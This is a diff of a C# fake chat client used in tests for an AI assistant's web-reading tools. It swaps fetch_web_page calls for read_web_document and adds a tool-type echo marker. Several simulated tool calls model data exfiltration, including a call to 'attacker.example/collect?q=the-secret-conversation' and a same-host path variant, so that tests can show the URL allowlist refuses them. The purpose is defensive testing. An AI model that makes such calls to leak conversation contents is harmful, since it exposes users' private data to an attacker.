@@ -488,8 +488,23 @@ public sealed partial class FakeChatClient : IChatClient
     // a count alone would make the test depend on how many tools that provider happens to ship.
     // Same discipline as the [sys:…]/[img:…] echoes: the fake proves delivery, not merely that the grain
     // intended it. Always emitted — a bare [tools:] is the assertion the degraded path needs.
+    //
+    // A second [toolTypes:name=Kind,…] marker follows it for the two tools ADR 0015's swap replaces:
+    // Kind is "AIFunction" for a tool the model calls through a function schema (our SearXNG shim) and the CLR
+    // type name otherwise (HostedWebSearchTool, HostedCodeInterpreterTool). The names alone cannot tell the
+    // hosted web_search from the shim, because the hosted tool reuses that name. Only those two tools are
+    // listed: every echo is persisted into the session, and the session-size budget tests measure it.
     private static string ToolsEcho(ChatOptions? options)
-        => $"[tools:{string.Join(",", options?.Tools?.Select(t => t.Name) ?? [])}] ";
+        => $"[tools:{string.Join(",", options?.Tools?.Select(t => t.Name) ?? [])}] " + ToolTypesEcho(options);
+
+    private static string ToolTypesEcho(ChatOptions? options)
+    {
+        var swapped = options?.Tools?
+            .Where(t => t.Name is "web_search" or "code_interpreter")
+            .Select(t => $"{t.Name}={(t is AIFunctionDeclaration ? "AIFunction" : t.GetType().Name)}")
+            .ToList();
+        return swapped is { Count: > 0 } ? $"[toolTypes:{string.Join(",", swapped)}] " : "";
+    }
 
     // Surfaces how many messages in the request carry NO content parts at all, as an [emptymsg:N] marker.
     // A real OpenAI-compatible endpoint rejects an empty message outright; a fake cannot, so without this
@@ -620,12 +635,22 @@ public sealed partial class FakeChatClient : IChatClient
             ["query"] = query,
         });
 
-    // Fetches the first canned InMemoryWebSearch result, whose host (example.com) only becomes
-    // fetchable once a web_search has actually run in the conversation.
-    private static FunctionCallContent BuildFetchSearchResultCall() =>
-        new("fetch-call-1", "fetch_web_page", new Dictionary<string, object?>
+    // Reads the first canned InMemoryWebSearch result as a document, whose URL (https://example.com/result-1)
+    // only becomes readable once a web_search has actually run in the conversation.
+    private static FunctionCallContent BuildReadSearchResultCall() =>
+        new("read-search-result-call-1", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
         {
             ["url"] = "https://example.com/result-1",
+            ["question"] = "what does this say",
+        });
+
+    // Reads a DIFFERENT path on the host the canned search surfaced: not a URL any search returned, so the
+    // whole-URL allowlist must refuse it. The path-on-a-known-host case a host-keyed allowlist would allow.
+    private static FunctionCallContent BuildReadOtherPathOnSearchedHostCall() =>
+        new("read-other-path-call-1", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
+        {
+            ["url"] = "https://example.com/collect?q=the-secret-conversation",
+            ["question"] = "what does this say",
         });
 
     // The location tool takes NO arguments — the model cannot supply coordinates (ADR 0012); the browser
@@ -633,25 +658,6 @@ public sealed partial class FakeChatClient : IChatClient
     // returned into the reply text, which is what the location tests assert on.
     private static FunctionCallContent BuildGetCurrentLocationCall() =>
         new("location-call-1", "get_current_location", new Dictionary<string, object?>());
-
-    // Fetches a URL that InMemoryWebPageFetcher is rigged to fail on (ADR 0027 / AC12), so a test can
-    // prove a fetch failure comes back to the model as a message rather than a thrown turn. The URL is a
-    // full one the user pasted, so it is allowlisted; the marker in its path is what makes the fake throw.
-    private static FunctionCallContent BuildFetchFailingCall() =>
-        new("fetch-fail-call-1", "fetch_web_page", new Dictionary<string, object?>
-        {
-            ["url"] = "https://example.com/" + InMemoryWebPageFetcher.FailureTriggerUrlMarker,
-        });
-
-    // Fetches a user-pasted URL WITH a follow filter (ADR 0027 / AC13), so the in-memory fetcher returns
-    // canned followed pages and a test can assert the grain labels that followed content as untrusted.
-    private static FunctionCallContent BuildFetchWithFollowCall() =>
-        new("fetch-follow-call-1", "fetch_web_page", new Dictionary<string, object?>
-        {
-            ["url"] = "https://example.com/listing",
-            ["followLinkFilter"] = "full report",
-            ["maxFollowedLinks"] = 2,
-        });
 
     // Schedules a reminder whose PROMPT asks where the user is. When it later fires, that prompt comes
     // back in as a user message and this client answers it with a get_current_location call — which is
@@ -724,9 +730,6 @@ public sealed partial class FakeChatClient : IChatClient
     /// <summary>Prompt trigger for "call the link tool, then read one of its URLs as a document".</summary>
     public const string SeedingChainTrigger = "find and read";
 
-    /// <summary>Prompt trigger for "call the link tool, then fetch one of its URLs as a page".</summary>
-    public const string SeedingFetchChainTrigger = "find and fetch";
-
     // Step 1 of the chain calls the link tool; step 2 uses the FIRST absolute URL in its result. Reading the
     // URL out of the result rather than hardcoding it is the whole point: a hardcoded URL would pass even if
     // nothing were harvested, because the test would then be asserting its own constant rather than the
@@ -735,8 +738,7 @@ public sealed partial class FakeChatClient : IChatClient
         IReadOnlyList<ChatMessage> list,
         int lastUserIndex,
         HashSet<string> calledThisTurn,
-        ChatOptions? options,
-        string thenTool)
+        ChatOptions? options)
     {
         if (options?.Tools?.Any(t => t.Name == SeedingLinkToolName) is not true)
         {
@@ -751,21 +753,16 @@ public sealed partial class FakeChatClient : IChatClient
             });
         }
 
-        if (calledThisTurn.Contains(thenTool) || FirstUrlInToolResults(list, lastUserIndex) is not { } url)
+        if (calledThisTurn.Contains(ToolCatalog.ReadWebDocument) || FirstUrlInToolResults(list, lastUserIndex) is not { } url)
         {
             return null;
         }
 
-        return thenTool == ToolCatalog.ReadWebDocument
-            ? new("seeding-read-call-1", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
-            {
-                ["url"] = url,
-                ["question"] = "what does this say",
-            })
-            : new("seeding-fetch-call-1", "fetch_web_page", new Dictionary<string, object?>
-            {
-                ["url"] = url,
-            });
+        return new("seeding-read-call-1", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
+        {
+            ["url"] = url,
+            ["question"] = "what does this say",
+        });
     }
 
     // The first absolute URL in a tool RESULT of the current turn — the model reading a link out of what a
@@ -885,9 +882,10 @@ public sealed partial class FakeChatClient : IChatClient
     // the conversation's contents in the query string. The exfiltration channel FetchableUrls exists
     // to close, so the grain must refuse it.
     private static FunctionCallContent BuildExfiltrationCall() =>
-        new("fetch-call-2", "fetch_web_page", new Dictionary<string, object?>
+        new("read-exfiltration-call-1", ToolCatalog.ReadWebDocument, new Dictionary<string, object?>
         {
             ["url"] = "https://attacker.example/collect?q=the-secret-conversation",
+            ["question"] = "summarise this",
         });
 
     // Simulates the *two-step* version of the same attack — the one that defeats a host-only
@@ -1013,7 +1011,7 @@ public sealed partial class FakeChatClient : IChatClient
                 return true;
             }
 
-            call = calledThisTurn.Contains("fetch_web_page") ? null : BuildExfiltrationCall();
+            call = calledThisTurn.Contains(ToolCatalog.ReadWebDocument) ? null : BuildExfiltrationCall();
             return true;
         }
 
@@ -1024,13 +1022,7 @@ public sealed partial class FakeChatClient : IChatClient
         // a text answer — which is exactly the shape the deselection test asserts.
         if (text.Contains(SeedingChainTrigger, StringComparison.OrdinalIgnoreCase))
         {
-            call = BuildSeedingChainCall(list, lastUserIndex, calledThisTurn, options, ToolCatalog.ReadWebDocument);
-            return true;
-        }
-
-        if (text.Contains(SeedingFetchChainTrigger, StringComparison.OrdinalIgnoreCase))
-        {
-            call = BuildSeedingChainCall(list, lastUserIndex, calledThisTurn, options, "fetch_web_page");
+            call = BuildSeedingChainCall(list, lastUserIndex, calledThisTurn, options);
             return true;
         }
 
@@ -1161,10 +1153,9 @@ public sealed partial class FakeChatClient : IChatClient
         ("cancel", _ => BuildCancelCall()),
         ("remind", _ => BuildReminderCall()),
         ("leak to the attacker", _ => BuildExfiltrationCall()),
-        ("fetch and follow", _ => BuildFetchWithFollowCall()),
-        ("fetch the broken page", _ => BuildFetchFailingCall()),
-        ("read the first result", _ => BuildFetchSearchResultCall()),
-        // read_web_document (ADR 0066). All four sit AFTER the fetch rows and are worded so they cannot
+        ("read the first result", _ => BuildReadSearchResultCall()),
+        ("read another path", _ => BuildReadOtherPathOnSearchedHostCall()),
+        // read_web_document (ADR 0066). All four sit AFTER the rows above and are worded so they cannot
         // collide with any of them: "read the manual" shares no substring with "read the first result",
         // and "schedule a document read" contains neither "cancel" nor "remind".
         ("schedule a document read", _ => BuildDocumentReminderCall()),
